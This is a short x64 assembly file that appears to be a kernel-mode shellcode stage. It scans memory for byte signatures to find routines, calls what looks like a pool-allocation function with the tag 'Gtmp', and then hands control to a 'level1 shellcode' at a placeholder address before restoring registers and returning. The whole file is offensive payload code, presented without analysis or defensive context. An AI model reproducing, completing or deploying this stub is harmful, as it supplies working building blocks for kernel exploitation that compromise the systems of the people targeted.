use64

push    rax
push    rcx
push    rdx
push    r8
push    r9
push    r10
push    r11
push    qword [rsp + 0D0h]
call    sub_34
mov	    r8d, 706D7447h
mov	    rdx, 1
mov	    ecx, 21h ; '!'
call    qword [rax]
push    rax
push    qword [rsp+0D8h]
call    sub_71
; call level1 shellcode
pop     rsi
push    rax
sub     rsp, 20h
mov     rax, 0x00000000AAAAAAAA
call 	rax
add     rsp, 20h
pop     rax
pop     r11
pop     r10
pop     r9
pop     r8
pop     rdx
pop     rcx
push    rax
mov     rax, [rsp + 8]
retn    8

sub_34:
push    rbp
mov	    rbp, rsp
mov	    rax, [rbp + 10h]
movsxd  rcx, dword [rax - 4]
add     rcx, rax
mov     [rbp + 10h], rcx

loc_47:
mov	    rax, [rbp + 10h]
inc	    rax
mov	    [rbp + 10h], rax
mov	    eax, [rax]
cmp	    eax, 0FFCD8B41h
jnz	    short loc_47
mov	    rax, [rbp + 10h]
add	    rax, 9
movsxd  rcx, dword [rax - 4]
add     rax, rcx
mov     rsp, rbp
pop     rbp
retn    8

sub_71:
push	rbp
mov     rbp, rsp
mov	    rax, [rbp + 10h]
movsxd  rcx, dword [rax-4]
add	    rcx, rax
mov     [rbp + 10h], rcx
mov	    dword [rbp - 4], 0

loc_8B:
mov	    rax, [rbp + 10h]
inc	    rax
mov	    [rbp + 10h], rax
mov	    eax, [rax]
cmp	    eax, 0FC43B41h
jnz	    short loc_8B
cmp	    dword [rbp - 4], 1
jz	    short loc_AA
inc	    dword [rbp - 4]
jmp	    short loc_8B

loc_AA:
mov	    rax, [rbp + 10h]
mov	    rsp, rbp
pop	    rbp
retn    8